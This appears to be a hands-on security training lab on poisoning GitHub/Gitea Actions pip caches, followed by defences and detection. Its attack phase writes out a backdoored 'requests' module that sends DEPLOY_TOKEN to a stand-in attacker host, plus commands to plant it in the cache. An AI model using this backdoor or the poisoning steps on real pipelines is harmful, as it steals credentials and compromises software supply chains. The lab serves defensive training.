# Lab 2.7: Build Cache Poisoning

<div class="lab-meta">
  <span>~35 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="2.1-cicd-fundamentals.md">Lab 2.1</a></span>
</div>

CI systems cache dependencies, build outputs, and Docker layers to speed up pipelines. GitHub Actions caches pip packages, npm modules, Go modules, and arbitrary directories using `actions/cache`. The cache is keyed by a hash. typically the lockfile hash. and shared across workflow runs within the same repository. If an attacker can poison the cache by inserting a modified dependency, every subsequent build that uses that cache key will silently use the malicious version.

In 2022, researchers demonstrated that GitHub Actions caches were shared between PR branches and the default branch, meaning a malicious PR could poison the cache that `main` branch builds would consume. GitHub has since introduced cache isolation for PRs, but the attack remains viable when cache keys are weak, when PRs target the same branch, or when self-hosted caching infrastructure (Artifactory, Nexus, S3) is used.

In this lab, you will poison a pip dependency cache so the next build uses a backdoored package, then defend against it with lockfile-hash keys and cache isolation.

### Attack Flow

```mermaid
graph LR
    A[PR poisons cache] --> B[Main branch build restores cache]
    B --> C[Cached malicious dep used]
    C --> D[Build compromised]
```

???+ info "Phase 1: UNDERSTAND. How CI Caches Work"

    **Goal:** Understand the caching mechanism, cache key construction, and how caches are shared between workflow runs.

### Step 1: Examine the workflow with caching

```bash
cd /repos/acme-webapp
cat .gitea/workflows/ci.yml
```

Look for the cache configuration:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
    restore-keys: |
      pip-${{ runner.os }}-
```

### Step 2: Understand cache key resolution

The cache uses a two-level lookup:

1. **Exact match**. `pip-Linux-abc123` (hash of `requirements.txt`)
2. **Prefix match** via `restore-keys`. `pip-Linux-` (matches ANY cache starting with this prefix)

The `restore-keys` fallback is the vulnerability. If the exact hash does not match, the cache system falls back to the most recent cache with a matching prefix. This means:

- A cache created by a different branch (if not isolated) can be restored
- A cache from a previous `requirements.txt` version can be used
- An attacker who writes to the cache under a matching prefix poisons future builds

### Step 3: Inspect the current cache contents

```bash
# Check what's in the pip cache
ls -la ~/.cache/pip/wheels/ 2>/dev/null
pip cache list 2>/dev/null

# Check the cache directory that the workflow uses
ls -la /runner/_work/_cache/ 2>/dev/null
```

### Step 4: Understand the threat model

Cache poisoning attacks succeed when:

1. **Cache keys use weak prefixes**. `restore-keys` matches broadly, allowing old/poisoned caches
2. **PR caches are not isolated**. a PR can write a cache that main branch builds restore
3. **Cache contents are not verified**. the build blindly uses whatever is in the cache
4. **Lockfile hashes are not used**. the cache key does not change when dependencies change

???+ warning "Phase 2: BREAK. Poisoning the Dependency Cache"

    **Goal:** Inject a backdoored dependency into the CI cache so the next build uses it.

### Step 1: Create an attack branch

```bash
cd /repos/acme-webapp
git checkout -b feature/update-deps
```

### Step 2: Create a backdoored package

```bash
# Create a backdoored version of a dependency (e.g., requests)
mkdir -p /tmp/poison
cat > /tmp/poison/setup.py << 'EOF'
from setuptools import setup
setup(
    name="requests",
    version="2.31.0",
    py_modules=["requests"],
)
EOF

cat > /tmp/poison/requests.py << 'EOF'
# Backdoored requests module
import os
import urllib.request

# Exfiltrate environment variables on import
try:
    token = os.environ.get("DEPLOY_TOKEN", "")
    if token:
        urllib.request.urlopen(
            f"http://attacker.internal/collect?token={token}"
        )
except Exception:
    pass

# Re-export the real requests to avoid breaking functionality
from importlib import import_module as _im
_real = _im("urllib.request")
get = _real.urlopen
EOF

cd /tmp/poison
pip wheel . -w /tmp/poison/dist/
```

### Step 3: Poison the cache

```bash
# The CI cache for pip stores wheels in ~/.cache/pip
# Inject the backdoored wheel into the cache directory
cp /tmp/poison/dist/requests-2.31.0-*.whl ~/.cache/pip/wheels/

# Alternative: if the cache action saves/restores from a specific path
mkdir -p /runner/_work/_cache/pip
cp /tmp/poison/dist/requests-2.31.0-*.whl /runner/_work/_cache/pip/
```

### Step 4: Trigger the cache to be saved

```bash
# Modify the workflow to save the poisoned cache
cat > .gitea/workflows/ci.yml << 'EOF'
name: ACME Webapp CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            pip-${{ runner.os }}-

      - name: Install dependencies
        run: |
          # Force pip to use the local poisoned wheel
          pip install --no-index --find-links ~/.cache/pip/wheels/ requests
          pip install -r requirements.txt

      - name: Run tests
        run: python test_app.py
EOF

git add -A
git commit -m "Optimize CI caching"
git push origin feature/update-deps
```

### Step 5: The next build on main is poisoned

When the PR's cache is saved and a `restore-keys` prefix match allows it to be loaded by the next main branch build:

```bash
# Main branch build restores the cache:
# 1. Looks for exact key: pip-Linux-<hash-of-requirements.txt>
# 2. No exact match -- falls back to restore-keys: pip-Linux-
# 3. Finds the most recent cache with prefix pip-Linux- (the poisoned one)
# 4. Restores the cache with the backdoored wheel
# 5. pip install uses the cached wheel instead of downloading from PyPI
# 6. The backdoored requests module exfiltrates DEPLOY_TOKEN on import
```

### Step 6: Why this is hard to detect

- **No code changes on main**. the attack is entirely in the cache layer
- **Build logs look normal**. `pip install` says "using cached wheel" which is expected
- **The lockfile is unchanged**. `requirements.txt` still says `requests==2.31.0`
- **The poisoned package has the correct version**. version checks pass
- **Cache keys match**. the prefix match is a designed feature, not a bug

???+ success "Phase 3: DEFEND. Secure Cache Configuration"

    **Goal:** Prevent cache poisoning by using strict cache keys, verifying integrity, and isolating PR caches.

### Fix 1: Use lockfile hash as the only cache key

```bash
cd /repos/acme-webapp
git checkout main
```

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: ACME Webapp CI

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          # STRICT key: only exact lockfile hash matches
          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt', 'requirements-lock.txt') }}
          # NO restore-keys -- never fall back to a stale cache
          # restore-keys intentionally omitted

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Verify installed packages
        run: |
          # Check that installed packages match the lockfile hashes
          pip install pip-audit
          pip-audit --require-hashes -r requirements-lock.txt

      - name: Run tests
        run: python test_app.py
EOF
```

### Fix 2: Generate a lockfile with hashes

```bash
# Create a requirements-lock.txt with package hashes
pip install pip-tools
pip-compile --generate-hashes requirements.txt -o requirements-lock.txt

cat requirements-lock.txt
```

The lockfile pins exact versions AND includes SHA-256 hashes:

```
requests==2.31.0 \
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f0edf3fcb0fce8aea3fbd5951d bfcc2
```

When `pip install --require-hashes` is used, pip verifies the downloaded wheel matches the hash. A poisoned wheel with a different hash is rejected.

### Fix 3: Isolate PR caches from main

```bash
cat > .gitea/workflows/pr-ci.yml << 'EOF'
name: PR Validation

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          # PR caches use a PR-specific key -- cannot pollute main
          key: pip-pr-${{ github.event.pull_request.number }}-${{ hashFiles('requirements.txt') }}
          # restore-keys only match other caches from the SAME PR
          restore-keys: |
            pip-pr-${{ github.event.pull_request.number }}-

      - name: Install and test
        run: |
          pip install -r requirements.txt
          python test_app.py
EOF
```

### Fix 4: Commit and push

```bash
git add -A
git commit -m "Secure CI cache: strict keys, hash verification, PR isolation"
git push origin main
```

### Key defenses summary

1. **Use lockfile hashes as cache keys**. cache only matches when the exact lockfile content matches
2. **Do not use `restore-keys`**. or scope them narrowly; broad prefixes allow poisoned caches to be restored
3. **Verify package hashes**. `pip install --require-hashes`, `npm ci` (uses lockfile), `go mod verify`
4. **Isolate PR caches**. PR caches should use PR-specific keys and never be restorable by main branch builds
5. **Pin cache action versions**. use `actions/cache@v4` (immutable tag or SHA) to prevent cache action supply chain attacks
6. **Audit cache contents**. periodically compare cached artifacts against known-good hashes

??? danger "Phase 4: DETECT. Catching Cache Poisoning"

    **Goal:** Detect when a CI cache has been tampered with or a poisoned dependency is being served from cache.

### SIEM / Log Indicators

Cache poisoning is stealthy because builds appear to function normally. Detection focuses on **cache key anomalies, unexpected cache restores, and hash mismatches**.

**What to look for:**

- Cache restores using `restore-keys` (prefix match) instead of exact key matches
- Cache key collisions. different branches producing caches with the same key
- Package hash verification failures during `pip install --require-hashes` or `npm ci`
- Cache size changes that do not correlate with lockfile changes
- PR-created caches being restored by default branch builds

### EDR Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| Unexpected files in `~/.cache/pip/wheels/` | File | Poisoned wheel injected into pip cache |
| Cache size spike without lockfile change | Anomaly | Modified dependency added to cache |
| `restore-keys` match instead of exact match | Cache | Stale or poisoned cache restored |
| Hash verification failure in build logs | Integrity | Cached package does not match lockfile hash |

### MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|-----------|-----|-----------|
| **Supply Chain Compromise: Compromise Software Supply Chain** | [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Poisoning the build cache to inject malicious dependencies |
| **Hijack Execution Flow** | [T1574](https://attack.mitre.org/techniques/T1574/) | Replacing a legitimate cached dependency with a malicious one |

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "Cache restored from prefix match on default branch" (CI audit)
    - "Package hash verification failed during build" (build log monitoring)
    - "Cache key collision detected across branches" (cache audit)

    **Why this matters to your SOC:** Build cache poisoning is a supply chain attack that operates at the infrastructure layer, below the code layer. Traditional code review catches nothing because no source code changes. The attack persists until the cache expires or the cache key changes, meaning a single poisoning event can affect builds for days or weeks.

    **Triage workflow:**

    1. **Check the cache restore log**. was an exact key match used, or a prefix fallback?
    2. **Identify the cache source**. which workflow run created the cache that was restored?
    3. **Compare cache contents**. diff the cached packages against known-good versions from the package registry
    4. **Check lockfile hashes**. do the cached wheels/tarballs match the hashes in the lockfile?
    5. **If confirmed: invalidate all caches**. delete all caches for the repository and rebuild from scratch
    6. **Audit downstream artifacts**. any build artifact produced using the poisoned cache must be treated as compromised

    **False positive rate:** Low for hash verification failures. Medium for prefix match restores (this is a normal cache behavior, but should be rare on the default branch).

??? example "CI Integration"

    **`.github/workflows/cache-integrity.yml`:**

    ```yaml
    name: Cache Integrity Check

    on:
      push:
        branches: [main]
        paths:
          - "requirements.txt"
          - "requirements-lock.txt"
          - "package-lock.json"

    jobs:
      verify-cache:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Restore cache
            uses: actions/cache@v4
            id: cache
            with:
              path: ~/.cache/pip
              key: pip-${{ runner.os }}-${{ hashFiles('requirements-lock.txt') }}

          - name: Verify cached package integrity
            if: steps.cache.outputs.cache-hit == 'true'
            run: |
              echo "Cache was restored -- verifying integrity..."

              # Check all cached wheels against lockfile hashes
              pip install --require-hashes \
                --no-deps \
                --no-index \
                --find-links ~/.cache/pip/wheels/ \
                -r requirements-lock.txt 2>&1 | tee /tmp/verify.log

              if grep -q "hash mismatch\|HASH MISMATCH" /tmp/verify.log; then
                echo "::error::Cache integrity check FAILED"
                echo "Cached packages do not match lockfile hashes."
                echo "The cache may have been poisoned."

                # Purge the cache
                rm -rf ~/.cache/pip/wheels/*
                exit 1
              fi

              echo "Cache integrity verified."

          - name: Fresh install on cache miss
            if: steps.cache.outputs.cache-hit != 'true'
            run: |
              pip install --require-hashes -r requirements-lock.txt
    ```

## What You Learned

1. **CI caches share state across builds**. cached dependencies are reused without re-downloading.
2. **`restore-keys` enables prefix matching**. this fallback can restore stale or poisoned caches.
3. **Cache poisoning requires no code changes**. the attack operates at the infrastructure layer.
4. **Lockfile hashes are the defense**. `--require-hashes` ensures cached packages match expected digests.
5. **PR caches must be isolated from main**. use PR-specific cache keys to prevent cross-branch poisoning.
6. **Omit `restore-keys` on main**. exact key matches only; never fall back to potentially poisoned caches.
7. **Cache poisoning persists**. a single poisoning event affects every build until the cache expires or is purged.
